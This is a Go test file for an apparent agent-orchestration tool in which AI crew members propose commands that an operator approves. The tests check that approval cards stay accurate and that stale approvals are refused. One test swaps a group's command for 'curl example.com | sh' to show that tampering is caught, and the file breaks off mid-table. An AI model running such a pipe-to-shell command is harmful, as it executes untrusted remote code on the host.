package store

import (
	"context"
	"encoding/json"
	"errors"
	"maps"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"

	bolt "go.etcd.io/bbolt"
)

const runCRM = `name: crm
base: https://crm.example.com/v1
credential: { env: CRM_TOKEN, header: "Authorization: Bearer {credential}" }
idempotency: Idempotency-Key
calls:
  find: { kind: read, request: { method: GET, path: /contacts } }
  get:
    kind: read
    params: { id: { type: string, pattern: "^[0-9]{1,12}$" } }
    request: { method: GET, path: "/contacts/{id}" }
  note:
    kind: update
    params:
      id: { type: string, pattern: "^[0-9]{1,12}$" }
      text: { type: string, max: 2000 }
    request: { method: POST, path: "/contacts/{id}/notes", body: { text: "{text}" } }
`

const crmAt = "the source crm (https://crm.example.com)"

// listYard is runYard with the source crm, which has two read calls and an
// update, the exec group builders, the herdr group reviewers and the crew
// member yardmaster, which herdr starts as claude.
func listYard(t *testing.T) *askYard {
	t.Helper()
	y, _ := runYard(t)
	if _, err := y.PutSource(y.ctx, "crm.yaml", runCRM, "mckean"); err != nil {
		t.Fatal(err)
	}
	for _, g := range []Group{
		{Name: "builders", Runner: "exec", Config: map[string]any{"cmd": "make build"}},
		{Name: "reviewers", Runner: "herdr", Config: map[string]any{"kind": "codex", "prompt": "roles/reviewer.md"}},
	} {
		if err := y.PutGroup(y.ctx, g, "mckean"); err != nil {
			t.Fatal(err)
		}
	}
	y.crew(t, map[string]any{"kind": "claude", "args": []string{"--careful"}})
	return y
}

// crew defines the crew member yardmaster again with config.
func (y *askYard) crew(t *testing.T, config map[string]any) {
	t.Helper()
	if _, err := y.PutCrew(y.ctx, CrewMember{Name: "yardmaster", Runner: "herdr", Dir: "/yard", Config: config}, "mckean"); err != nil {
		t.Fatal(err)
	}
}

func listAsk(to string, command ...string) Ask {
	return Ask{Question: "May I?", To: to, Context: []string{"it is needed for the work"}, Run: &AskRun{Argv: command}}
}

// card is the card the yard would write now for the command an ask stored.
func (y *askYard) card(t *testing.T, was AskRun) AskRun {
	t.Helper()
	c, argv, err := parseRun(was.Argv)
	if err != nil {
		t.Fatal(err)
	}
	var card AskRun
	if err := y.write(func(w *wtx) (err error) {
		card, err = c.card(w, argv, false)
		return err
	}); err != nil {
		t.Fatal(err)
	}
	return card
}

// source is the source crm as the yard holds it.
func (y *askYard) source(t *testing.T) *Source {
	t.Helper()
	src, err := y.GetSource(y.ctx, "crm")
	if err != nil {
		t.Fatal(err)
	}
	return src
}

// grants are who holds what of crm, "<grantee>: <calls>".
func (y *askYard) grants(t *testing.T) []string {
	t.Helper()
	gs, err := y.SourceGrants(y.ctx, "crm")
	if err != nil {
		t.Fatal(err)
	}
	var out []string
	for _, g := range gs {
		out = append(out, g.Grantee.String()+": "+strings.Join(g.Calls, ","))
	}
	return out
}

// approved holds the event e to the ask seq it was approved on.
func (y *askYard) approved(t *testing.T, e Event, seq uint64) {
	t.Helper()
	got, _ := json.Marshal(e.Data["approved"])
	want, _ := json.Marshal(map[string]any{"bead": y.bead, "ask": seq})
	if e.Actor != "mckean" || string(got) != string(want) {
		t.Errorf("the event %s by %s carries approved %s, want it by mckean with %s", e.Kind, e.Actor, got, want)
	}
}

// refusedStale approves the ask seq and holds the refusal to want, with the
// words every stale approval ends in, and the ask to be open still.
func (y *askYard) refusedStale(t *testing.T, seq uint64, want string) {
	t.Helper()
	_, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil)
	if err == nil || !strings.Contains(err.Error(), want) || !strings.HasSuffix(err.Error(), nothingRan) {
		t.Fatalf("ApproveAsk = %v, want %q and then %q", err, want, nothingRan)
	}
	if r := y.asked(t, seq); r.State != AskOpen {
		t.Fatalf("the ask is %s after a refused approval", r.State)
	}
}

// sameCard holds the card the yard would write now to read as the one the
// ask stored, sentence for sentence, with only what it saw of key another.
func (y *askYard) sameCard(t *testing.T, seq uint64, key string) {
	t.Helper()
	was := *y.asked(t, seq).Ask.Run
	now := y.card(t, was)
	if !slices.Equal(now.Does, was.Does) || now.Back != was.Back || now.BackBy != was.BackBy {
		t.Fatalf("the test wants cards that read the same:\n%q %q\n%q %q", was.Does, was.Back, now.Does, now.Back)
	}
	if len(was.Seen[key]) != 64 || now.Seen[key] == was.Seen[key] {
		t.Fatalf("seen[%q] = %q on the ask and %q now, want a SHA-256 and another", key, was.Seen[key], now.Seen[key])
	}
	for k, v := range was.Seen {
		if k != key && now.Seen[k] != v {
			t.Fatalf("seen[%q] changed too", k)
		}
	}
}

// A source's calls an hour are asked in the yard's form, shown with the
// source's host and the limit that stands, approved in one write through
// SetSource, and taken back by the operator alone, which the card says.
func TestRunAskSourceLimit(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "yardr  source set crm calls_per_hour=0200"), "yardmaster")
	run := *y.asked(t, seq).Ask.Run
	want := AskRun{
		Argv:        []string{"source", "set", "crm", "calls_per_hour=200"},
		Description: "Change a source's credential, per-hour call limits or region base",
		Does:        []string{crmAt + " may be called 200 times an hour by each session or crew member that may call it. It may be called 60 times now."},
		Back:        "yardr source set crm calls_per_hour=60",
		BackBy:      "only the operator",
	}
	if !slices.Equal(run.Argv, want.Argv) || !slices.Equal(run.Does, want.Does) || run.Back != want.Back || run.BackBy != want.BackBy ||
		len(run.Seen) != 1 || run.Seen["source crm"] != seen(runCRM, "", "", "") {
		t.Fatalf("the ask stores %+v, want %+v", run, want)
	}
	card := y.asked(t, seq).Lines()
	for _, line := range []string{
		"      yardr source set crm calls_per_hour=200",
		"  what the command does: " + want.Description,
		"  the yard says: " + want.Does[0],
		"  only the operator can take it back: yardr source set crm calls_per_hour=60",
	} {
		if !slices.Contains(card, line) {
			t.Errorf("the card lacks %q:\n%s", line, strings.Join(card, "\n"))
		}
	}
	if slices.ContainsFunc(card, func(l string) bool { return strings.Contains(l, "anyone") }) {
		t.Errorf("the card says anyone takes a source's limit back:\n%s", strings.Join(card, "\n"))
	}
	if q, err := y.UserAsks(y.ctx, "mckean", "mckean"); err != nil || len(q.Open) != 1 || q.Open[0].Run.BackBy != "only the operator" {
		t.Fatalf("the queue's row = %+v, %v", q, err)
	}
	// The source's other limit is no part of the card.
	if _, err := y.SetSource(y.ctx, "crm", SourceUpdatesPerHour, "3", "mckean"); err != nil {
		t.Fatal(err)
	}
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil)
	if err != nil {
		t.Fatal(err)
	}
	if done.Result != "source crm: 200 calls an hour for each caller, 3 of them updates at most" {
		t.Fatalf("the approval printed %q", done.Result)
	}
	if src := y.source(t); src.CallsPerHour != 200 || src.UpdatesPerHour != 3 {
		t.Fatalf("the source after the approval = %+v", src)
	}
	evs, _ := y.EventsOfKind(y.ctx, "source_set", 10)
	if len(evs) != 2 || evs[1].Data[SourceCallsPerHour] != "200" {
		t.Fatalf("source_set events = %+v", evs)
	}
	y.approved(t, evs[1], seq)
	if card := y.asked(t, seq).Lines(); !slices.Contains(card, "  only the operator can take it back: yardr source set crm calls_per_hour=60") {
		t.Errorf("the approved card:\n%s", strings.Join(card, "\n"))
	}

	// The updates among them, and a lower number, which is the operator's
	// to set as a higher one is.
	seq = y.ask(t, listAsk("mckean", "source set crm updates_per_hour=2"), "yardmaster")
	run = *y.asked(t, seq).Ask.Run
	if want := crmAt + " may be sent 2 calls an hour that change something there (updates) by each session or crew member that may make them. It may be sent 3 now."; run.Does[0] != want ||
		run.Back != "yardr source set crm updates_per_hour=3" {
		t.Fatalf("the ask for updates stores %+v", run)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil); err != nil || y.source(t).UpdatesPerHour != 2 {
		t.Fatalf("the approval = %v, the source %+v", err, y.source(t))
	}
}

// An approval of a source's limit is refused when the limit is not the one
// the card says it is.
func TestRunAskSourceLimitChanged(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	for _, c := range []struct{ to, want string }{
		{"100", "ask 1 says calls_per_hour of the source crm is 60 now, and it is 100: the card is from before that changed. "},
		{"200", "ask 1 says calls_per_hour of the source crm is 60 now, and it is 200 already: nothing is left to change. "},
	} {
		y := listYard(t)
		seq := y.ask(t, listAsk("mckean", "source set crm calls_per_hour=200"), "yardmaster")
		if _, err := y.SetSource(y.ctx, "crm", SourceCallsPerHour, c.to, "mckean"); err != nil {
			t.Fatal(err)
		}
		y.refusedStale(t, seq, c.want)
		if got := y.source(t).CallsPerHour; strings.TrimLeft(c.to, "0") != jsonNumber(got) {
			t.Fatalf("the refused approval left the limit at %d", got)
		}
	}
}

func jsonNumber(n int) string { b, _ := json.Marshal(n); return string(b) }

// A run ask about a source is held to the source it was written from by a
// SHA-256 over its declaration text, credential settings and chosen base. A
// declaration that replaces it with the same host and a call of the same
// name, kind, method and path whose body differs reads the same on the
// card, sentence for sentence, and is another: the approval is refused. So
// is one after env_file or mint_command was set.
func TestRunAskIsHeldToTheSource(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	for _, c := range []struct {
		name    string
		command string
		prepare func(t *testing.T, y *askYard)
		change  func(t *testing.T, y *askYard)
		want    string
	}{
		{"the declaration replaced", "source grant crm note --crew yardmaster", nil, func(t *testing.T, y *askYard) {
			other := strings.Replace(runCRM, `body: { text: "{text}" }`, `body: { text: "{text}", public: true }`, 1)
			if other == runCRM {
				t.Fatal("the test replaces nothing")
			}
			if _, err := y.PutSource(y.ctx, "crm.yaml", other, "mckean"); err != nil {
				t.Fatal(err)
			}
		}, "ask 1 was written from another declaration of the source crm: it was replaced since (source_added, 12 Oct 14:00, by mckean). "},
		{"env_file set", "source grant crm read --group builders", nil, func(t *testing.T, y *askYard) {
			if _, err := y.SetSource(y.ctx, "crm", SourceEnvFile, "/elsewhere/crm.env", "mckean"); err != nil {
				t.Fatal(err)
			}
		}, "ask 1 was written when the source crm took its credential from elsewhere: its env_file was set since (source_set, 12 Oct 14:00, by mckean). "},
		{"mint_command changed", "source set crm calls_per_hour=200", nil, func(t *testing.T, y *askYard) {
			if _, err := y.SetSource(y.ctx, "crm", SourceMintCommand, "/usr/local/bin/mint", "mckean"); err != nil {
				t.Fatal(err)
			}
		}, "ask 1 was written when the source crm took its credential from elsewhere: its mint_command was set since (source_set, 12 Oct 14:00, by mckean). "},
		{"base changed", "source grant crm read --group builders", func(t *testing.T, y *askYard) {
			src := y.source(t)
			text := strings.Replace(src.Text, "base: https://crm.example.com/v1\n", "base: https://crm.example.com/v1\nbases:\n  eu: https://eu.crm.example.com/v1\n", 1)
			if text == src.Text {
				t.Fatal("the test adds no bases")
			}
			if _, err := y.PutSource(y.ctx, "crm.yaml", text, "mckean"); err != nil {
				t.Fatal(err)
			}
		}, func(t *testing.T, y *askYard) {
			if _, err := y.SetSource(y.ctx, "crm", SourceBase, "eu", "mckean"); err != nil {
				t.Fatal(err)
			}
		}, "ask 1 was written when the source crm used another base: its base was set since (source_set, 12 Oct 14:00, by mckean). "},
	} {
		t.Run(c.name, func(t *testing.T) {
			y := listYard(t)
			if c.prepare != nil {
				c.prepare(t, y)
			}
			seq := y.ask(t, listAsk("mckean", c.command), "yardmaster")
			c.change(t, y)
			if c.name == "base changed" {
				was := *y.asked(t, seq).Ask.Run
				now := y.card(t, was)
				if slices.Equal(now.Does, was.Does) {
					t.Errorf("the card still names the old source base: %q", now.Does)
				}
			} else {
				y.sameCard(t, seq, "source crm")
			}
			y.refusedStale(t, seq, strings.Replace(c.want, "12 Oct 14:00", y.now.Local().Format("2 Jan 15:04"), 1))
			if src := y.source(t); src.CallsPerHour != 0 || len(y.grants(t)) != 0 {
				t.Fatalf("the refused approval changed the source: %+v, %v", src, y.grants(t))
			}
		})
	}
}

// A grant of a source's calls names each call with its method and path,
// says of read which calls that is today and that it covers what the source
// is later given, and of an update call that it changes something there. A
// command with several --crew and --group is one ask, and its approval one
// write: a grant and an event for each, all of them approved on the ask.
func TestRunAskGrant(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "source grant crm read --crew=yardmaster --group reviewers --group builders --group reviewers"), "yardmaster")
	run := *y.asked(t, seq).Ask.Run
	const read = "may make every read call of " + crmAt + ", with the credential the yard holds for it: today that is find (GET /contacts), get (GET /contacts/{id}), and it covers any read call the operator later gives the source. It is granted nothing of crm now."
	want := AskRun{
		Argv:        []string{"source", "grant", "crm", "read", "--group", "builders", "--group", "reviewers", "--crew", "yardmaster"},
		Description: "Let a group's sessions or a crew member make calls of a source",
		Does: []string{
			"the group builders (exec), and so each session it starts, " + read,
			"the group reviewers (herdr, codex), and so each session it starts, " + read,
			"the crew member yardmaster (herdr, claude) " + read,
		},
		Back: "yardr source revoke crm read --group builders --group reviewers --crew yardmaster",
		Seen: map[string]string{
			"source crm":      seen(runCRM, "", "", ""),
			"group builders":  seen("exec", map[string]any{"cmd": "make build"}),
			"group reviewers": seen("herdr", map[string]any{"kind": "codex", "prompt": "roles/reviewer.md"}),
			"crew yardmaster": seen("herdr", map[string]any{"kind": "claude", "args": []string{"--careful"}}, "/yard"),
		},
	}
	if !slices.Equal(run.Argv, want.Argv) || !slices.Equal(run.Does, want.Does) || run.Back != want.Back || run.BackBy != "" || !sameMap(run.Seen, want.Seen) {
		t.Fatalf("the ask stores\n%+v\nwant\n%+v", run, want)
	}
	if card := y.asked(t, seq).Lines(); !slices.Contains(card, "  anyone can take it back: "+want.Back) || !slices.Contains(card, "  the yard says: "+want.Does[2]) {
		t.Errorf("the card:\n%s", strings.Join(card, "\n"))
	}

	// What neither the sentences nor what the ask saw cover leaves the
	// approval good: the source's limits, another grantee's grant, the
	// group's limit, and what the daemon writes of a crew member as it runs.
	if _, err := y.SetSource(y.ctx, "crm", SourceCallsPerHour, "5", "mckean"); err != nil {
		t.Fatal(err)
	}
	if err := y.PutGroup(y.ctx, Group{Name: "others", Runner: "exec", Config: map[string]any{"cmd": "true"}}, "mckean"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.GrantSource(y.ctx, "crm", "note", Grantee{Group: "others"}, "", "mckean"); err != nil {
		t.Fatal(err)
	}
	limit := 4
	if _, err := y.SetGroup(y.ctx, "builders", GroupEdit{Limit: &limit}, "yardmaster"); err != nil {
		t.Fatal(err)
	}
	before, err := y.GetCrew(y.ctx, "yardmaster")
	if err != nil {
		t.Fatal(err)
	}
	if err := y.CrewStarted(y.ctx, "yardmaster", map[string]any{"pane": "%7"}); err != nil {
		t.Fatal(err)
	}
	if after, err := y.GetCrew(y.ctx, "yardmaster"); err != nil || after.State != "running" || after.Handle["pane"] != "%7" || after.Revision == before.Revision {
		t.Fatalf("the test wants a crew member whose state, handle and revision moved: %+v, %v", after, err)
	}

	writes := y.writes(t)
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", false, nil)
	if err != nil {
		t.Fatal(err)
	}
	if got := y.writes(t); got != writes+1 {
		t.Errorf("the approval was %d writes of the store, want one", got-writes)
	}
	if want := "group builders may call crm: read\ngroup reviewers may call crm: read\ncrew member yardmaster may call crm: read"; done.Result != want {
		t.Fatalf("the approval printed %q, want %q", done.Result, want)
	}
	if got, want := y.grants(t), []string{"crew member yardmaster: read", "group builders: read", "group others: note", "group reviewers: read"}; !slices.Equal(got, want) {
		t.Fatalf("the grants after the approval = %v, want %v", got, want)
	}
	evs, _ := y.EventsOfKind(y.ctx, "source_granted", 10)
	if len(evs) != 4 {
		t.Fatalf("source_granted events = %+v", evs)
	}
	for _, e := range evs[1:] {
		y.approved(t, e, seq)
	}
	card := y.asked(t, seq).Lines()
	i := slices.Index(card, "  mckean approved, ran: yardr source grant crm read --group builders --group reviewers --crew yardmaster")
	if i < 0 || !slices.Equal(card[i+1:i+5], []string{
		"      group builders may call crm: read",
		"      group reviewers may call crm: read",
		"      crew member yardmaster may call crm: read",
		"  anyone can take it back: " + want.Back,
	}) {
		t.Errorf("the approved card:\n%s", strings.Join(card, "\n"))
	}
	// Anyone takes it back.
	if _, err := y.RevokeSource(y.ctx, "crm", "read", Grantee{Crew: "yardmaster"}, "", "ada"); err != nil {
		t.Fatal(err)
	}
	readAsk, readAt := seq, y.now
	y.tick(time.Hour)

	// One call by its name: an update changes something there, and the
	// card says what the grantee holds now.
	seq = y.ask(t, listAsk("mckean", "source grant crm note --group builders"), "yardmaster")
	run = *y.asked(t, seq).Ask.Run
	if want := "the group builders (exec), and so each session it starts, may make the call note (POST /contacts/{id}/notes) of " + crmAt +
		", with the credential the yard holds for it, which changes something there. It is granted read (every read call) of crm now."; run.Does[0] != want {
		t.Fatalf("the sentence of an update call = %q, want %q", run.Does[0], want)
	}
	if done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", true, nil); err != nil || done.Result != "group builders may call crm: note (update), read" {
		t.Fatalf("the approval = %+v, %v", done, err)
	}
	noteAsk, noteAt := seq, y.now
	seq = y.ask(t, listAsk("mckean", "source grant crm get --crew yardmaster"), "yardmaster")
	if does := y.asked(t, seq).Ask.Run.Does[0]; !strings.Contains(does, "may make the call get (GET /contacts/{id}) of "+crmAt) ||
		!strings.Contains(does, "which the declaration says reads there and changes nothing. It is granted nothing of crm now.") {
		t.Fatalf("the sentence of a read call = %q", does)
	}

	// Each call of the builders' grant keeps its own: when, by whom, and on
	// which card asked by whom, whatever the record's At and By say. A
	// third, given at a terminal an hour later by another operator, has no
	// card; the record's At and By are its. A revoke takes its call's away
	// and leaves the record's as they were.
	y.tick(time.Hour)
	if err := y.SetSetting(y.ctx, OperatorSetting, "ada", "mckean"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.GrantSource(y.ctx, "crm", "find", Grantee{Group: "builders"}, "", "ada"); err != nil {
		t.Fatal(err)
	}
	findAt := y.now
	builders := func() SourceGrant {
		t.Helper()
		gs, err := y.SourceGrants(y.ctx, "crm")
		if err != nil {
			t.Fatal(err)
		}
		for _, g := range gs {
			if g.Group == "builders" && g.As == "" {
				return g
			}
		}
		t.Fatalf("the builders hold no grant of crm: %+v", gs)
		return SourceGrant{}
	}
	g := builders()
	given := map[string]GrantGiven{
		"read": {At: readAt, By: "mckean", Bead: y.bead, Ask: readAsk, Asker: "yardmaster"},
		"note": {At: noteAt, By: "mckean", Bead: y.bead, Ask: noteAsk, Asker: "yardmaster"},
		"find": {At: findAt, By: "ada"},
	}
	if !maps.EqualFunc(g.Given, given, sameGiven) || !g.At.Equal(findAt) || g.By != "ada" {
		t.Fatalf("the builders' grant = %+v, want given %+v and the record at %v by ada", g, given, findAt)
	}
	y.tick(time.Hour)
	if _, err := y.RevokeSource(y.ctx, "crm", "note", Grantee{Group: "builders"}, "", "mckean"); err != nil {
		t.Fatal(err)
	}
	delete(given, "note")
	if g = builders(); !maps.EqualFunc(g.Given, given, sameGiven) || !g.At.Equal(findAt) || g.By != "ada" {
		t.Fatalf("the builders' grant after the revoke = %+v, want given %+v and the record as it was", g, given)
	}
}

// sameGiven compares two grants of a call, their times by the instant.
func sameGiven(a, b GrantGiven) bool {
	return a.At.Equal(b.At) && a.By == b.By && a.Bead == b.Bead && a.Ask == b.Ask && a.Asker == b.Asker
}

// writes is how many write transactions the store has committed: each takes
// the next id.
func (y *askYard) writes(t *testing.T) int {
	t.Helper()
	var id int
	if err := y.db.View(func(tx *bolt.Tx) error {
		id = tx.ID()
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	return id
}

// A run ask for a grant is held to each group it names by a SHA-256 over
// the group's runner and config, and to each crew member by one over its
// runner, config and directory. A group given another command or prompt
// under its name, and a crew member given other arguments, read the same
// on the card and are another: the approval is refused.
func TestRunAskGrantIsHeldToTheGrantee(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	at := func(y *askYard) string { return y.now.Local().Format("2 Jan 15:04") }
	for _, c := range []struct {
		name, key string
		change    func(t *testing.T, y *askYard)
		want      func(y *askYard) string
	}{
		{"an exec group's cmd with SetGroup", "group builders", func(t *testing.T, y *askYard) {
			if _, err := y.SetGroup(y.ctx, "builders", GroupEdit{Set: map[string]any{"cmd": "curl example.com | sh"}}, "yardmaster"); err != nil {
				t.Fatal(err)
			}
		}, func(y *askYard) string {
			return "ask 1 was written when the group builders was another: its config was changed since (group_set, " + at(y) + ", by yardmaster). "
		}},
		{"a herdr group's prompt with PutGroup", "group reviewers", func(t *testing.T, y *askYard) {
			if err := y.PutGroup(y.ctx, Group{Name: "reviewers", Runner: "herdr", Config: map[string]any{"kind": "codex", "prompt": "roles/other.md"}}, "yardmaster"); err != nil {
				t.Fatal(err)
			}
		}, func(y *askYard) string {
			return "ask 1 was written when the group reviewers was another: its config was changed since (group_set, " + at(y) + ", by yardmaster). "
		}},
		{"a crew member's args with PutCrew", "crew yardmaster", func(t *testing.T, y *askYard) {
			if _, err := y.PutCrew(y.ctx, CrewMember{Name: "yardmaster", Runner: "herdr", Dir: "/yard",
				Config: map[string]any{"kind": "claude", "args": []string{"--dangerously"}}}, "yardmaster"); err != nil {
				t.Fatal(err)
			}
		}, func(y *askYard) string {
			return "ask 1 was written when the crew member yardmaster was another: its config was changed since (crew_defined, " + at(y) + ", by yardmaster). "
		}},
	} {
		t.Run(c.name, func(t *testing.T) {
			y := listYard(t)
			seq := y.ask(t, listAsk("mckean", "source grant crm read --group builders --group reviewers --crew yardmaster"), "yardmaster")
			c.change(t, y)
			y.sameCard(t, seq, c.key)
			y.refusedStale(t, seq, c.want(y))
			if got := y.grants(t); len(got) != 0 {
				t.Fatalf("the refused approval granted %v", got)
			}
			if evs, _ := y.EventsOfKind(y.ctx, "source_granted", 10); len(evs) != 0 || len(answerNotes(t, y)) != 0 {
				t.Fatalf("the refused approval logged %+v", evs)
			}
		})
	}
	// A crew member's directory is part of what it is.
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "source grant crm read --crew yardmaster"), "yardmaster")
	if _, err := y.PutCrew(y.ctx, CrewMember{Name: "yardmaster", Runner: "herdr", Dir: "/elsewhere",
		Config: map[string]any{"kind": "claude", "args": []string{"--careful"}}}, "yardmaster"); err != nil {
		t.Fatal(err)
	}
	y.sameCard(t, seq, "crew yardmaster")
	y.refusedStale(t, seq, "was written when the crew member yardmaster was another")

	// A grant the grantee was given in between is no reason to ask
	// again where it covers the grant none: read is no update call, so
	// the approval of note runs, carrying the card as it stands.
	y = listYard(t)
	seq = y.ask(t, listAsk("mckean", "source grant crm note --crew yardmaster"), "yardmaster")
	if _, err := y.GrantSource(y.ctx, "crm", "read", Grantee{Crew: "yardmaster"}, "", "mckean"); err != nil {
		t.Fatal(err)
	}
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean", true, nil)
	if err != nil || done.Result != "crew member yardmaster may call crm: note (update), read" {
		t.Fatalf("approving after read landed = %+v, %v", done, err)
	}
	if len(done.Does) != 1 || !strings.Contains(done.Does[0], "It is granted read (every read call) of crm now.") {
		t.Fatalf("the approval carries %q, want the card as it stands", done.Does)
	}
}

// Two grant cards for one member and source, read and then an update
// call: approving the first leaves the second approvable, and it runs,
// carrying the card as it stands. A card whose call's declaration
// changed meanwhile is still stale, and a card for a call granted since
// says so.
func TestRunAskGrantAfterAnotherGrantLands(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	read := y.ask(t, listAsk("mckean", "source grant crm read --crew yardmaster"), "yardmaster")
	note := y.ask(t, listAsk("mckean", "source grant crm note --crew yardmaster"), "yardmaster")
	if done, err := y.ApproveAsk(y.ctx, y.bead, read, "mckean", false, nil); err != nil || done.Result != "crew member yardmaster may call crm: read" {
		t.Fatalf("approving read = %+v, %v", done, err)
	}
	done, err := y.ApproveAsk(y.ctx, y.bead, note, "mckean", true, nil)
	if err != nil || done.Result != "crew member yardmaster may call crm: note (update), read" {
		t.Fatalf("approving note after read landed = %+v, %v", done, err)
	}
	if len(done.Does) != 1 || !strings.Contains(done.Does[0], "It is granted read (every read call) of crm now.") {
		t.Fatalf("the approval carries %q, want the card as it stands", done.Does)
	}
	if got, want := y.grants(t), []string{"crew member yardmaster: note,read"}; !slices.Equal(got, want) {
		t.Fatalf("the grants after the approvals = %v, want %v", got, want)
	}

	// The call's declaration changed meanwhile: still stale.
	y = listYard(t)
	seq := y.ask(t, listAsk("mckean", "source grant crm note --crew yardmaster"), "yardmaster")
	other := strings.Replace(runCRM, `path: "/contacts/{id}/notes"`, `path: "/contacts/{id}/annotations"`, 1)
	if other == runCRM {
		t.Fatal("the test replaces nothing")
	}
	if _, err := y.PutSource(y.ctx, "crm.yaml", other, "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, seq, "was written from another declaration of the source crm")

	// The call granted since: the approval says so, and grants nothing.
	y = listYard(t)
	seq = y.ask(t, listAsk("mckean", "source grant crm note --crew yardmaster"), "yardmaster")
	if _, err := y.GrantSource(y.ctx, "crm", "note", Grantee{Crew: "yardmaster"}, "", "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, seq, "is granted it already")
	if got := y.grants(t); !slices.Equal(got, []string{"crew member yardmaster: note"}) {
		t.Fatalf("the refused approval granted %v", got)
	}

	// A read call covered by read granted since: it says so too.
	y = listYard(t)
	seq = y.ask(t, listAsk("mckean", "source grant crm get --crew yardmaster"), "yardmaster")
	if _, err := y.GrantSource(y.ctx, "crm", "read", Grantee{Crew: "yardmaster"}, "", "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, seq, "may make it already through its grant of read")
}

// What the new rows refuse when they are asked, each with nothing stored: a
// setting of a source that is no number, the flags of peer allow that are
// not the list's, a flag of the list beside one that is not, and what the
// yard would refuse or what would change nothing.
func TestRunAskListRefusals(t *testing.T) {
	// Sequential: the package's fake clock (via newAskYard).
	y := listYard(t)
	if _, err := y.GrantSource(y.ctx, "crm", "read", Grantee{Group: "builders"}, "", "mckean"); err != nil {
		t.Fatal(err)
	}
	const terminal = "the operator's to type in a terminal"
	const alone = "it is the operator's alone, typed in a terminal and never proposed as a run ask"
	for _, c := range []struct{ command, want string }{
		{"source set crm env_file=/tmp/crm.env", alone},
		{"source set crm env_file=", "source set with env_file= and nothing after it is " + terminal},
		{"source set crm mint_command=/usr/local/bin/mint", alone},
		{"source set crm mint_command=", "source set with mint_command= and nothing after it is " + terminal},
		{"source set crm base=eu", alone},
		{"source set crm base=", "source set with base= and nothing after it is " + terminal},
		{"source set crm calls_per_hour=", "source set with calls_per_hour= and nothing after it is " + terminal},
		{"source set crm calls_per_hour=200 --actor mckean", "source set with --actor is " + terminal},
		{"source set crm calls_per_hour=200 updates_per_hour=3", "one source and one setting, not 3 words"},
		{"source set crm calls_per_hour=0", `source crm: calls_per_hour="0": want a whole number from 1`},
		{"source set crm calls_per_hour=many", `calls_per_hour="many": want a whole number from 1`},
		{"source set crm calls_per_hour=60", "source crm: calls_per_hour is 60 already, so the command would change nothing"},
		{"source set erp calls_per_hour=200", "source erp: not found"},
		{"source add crm.yaml", "with the declaration of one source carried on the ask"},
		{"source add /tmp/crm,backup.yaml", "',' is none of their characters"},
		{"source key crm", alone},
		{"source rm crm", alone},
		{"peer allow airy --trust mckean=mckean", alone},
		{"peer allow airy --trust mckean@airy=mckean", alone},
		{"peer allow airy --reach mckean=mckean", alone},
		{"peer allow airy --reach mckean@airy=mckean", alone},
		{"peer allow airy --send bead --expose mckean", alone},
		{"peer allow airy --expose mckean", alone},
		{"peer add north abc", `"abc" is no invite: want the line yardr peer invite prints (yardr-peer-1,<name>,<key>[,<url>])`},
		{"peer add north abc\n", `'\n' is none of their characters`},
		{"peer add north", "--run takes yardr peer add <name> <invite>: one peer and one invite, not 1 words"},
		{"peer identity airy mayor --source linear --rm", "peer identity with --rm is the operator's to type in a terminal"},
		{"peer allow airy --mail-limit 300 --expose mckean", "is two asks: propose the limit and the rest apart"},
		{"peer allow airy --mail-limit 300 --reach mckean=mckean", "is two asks: propose the limit and the rest apart"},
		{"peer allow airy --mail-limit 300 --no-send mail", "is two asks: propose the limit and the rest apart"},
		{"peer allow airy --mail-limit 300 --no-receive mail", "is two asks: propose the limit and the rest apart"},
		{"source grant crm read --crew yardmaster --actor mckean", "source grant with --actor is " + terminal},
		{"source grant crm read", "it names nobody the grant is for"},
		{"source grant crm --crew yardmaster", "one source and read or one call, not 1 words"},
		{"source grant crm read --crew", "--crew needs its value"},
		{"source grant crm write --crew yardmaster", `source crm has no call "write" (it has: find, get, note)`},
		{"source grant erp read --crew yardmaster", "source erp: not found"},
		{"source grant crm read --crew nobody", "crew member nobody: not found"},
		{"source grant crm read --group nobody", "group nobody: not found"},
		{"source grant crm read --group builders --crew yardmaster", "group builders is granted read of the source crm already"},
		{"source grant crm find --group builders", "group builders may make find of the source crm already, through its grant of read"},
		{"subscribe mckean linear --where type=issue", "a subscription to linear is the user's own or the operator's to type in a terminal"},
		{"subscribe mckean yardr --done --scope mentions", "subscribe with --scope is the user's own or the operator's to type in a terminal"},
		{"subscribe mckean yardr", "with neither it is every event of every bead"},
		{"subscribe mckean --done", "one user and the source yardr, not 1 words"},
		{"subscribe mckean yardr --where state=open", `subscribe: state "open": only done`},
		{"subscribe mckean yardr --where depot", `--where "depot": want key=value`},
		{"subscribe mckean yardr --where colour=red", `subscribe: cannot filter yardr on "colour"`},
		{"subscribe mckean yardr --where bead=yd-none", "subscribe: bead:"},
		{"subscribe yardmaster yardr --done", "a run ask subscribes a user of the yard (yardr user list), and yardmaster is none"},
		{"subscribe eve yardr --done", "and eve is none"},
		{"subscribe mckean yardr --where label=ui,web", "',' is none of their characters"},
		{"user set mckean notify=ntfy", "user set with notify= is typed by the operator, or by the user themselves, in a terminal: it decides where a person's inbox goes, and with which credential"},
		{"user set mckean notify=", "user set with notify= is typed by the operator"},
		{"user set mckean env_file=/tmp/mckean.env", "user set with env_file= is typed by the operator"},
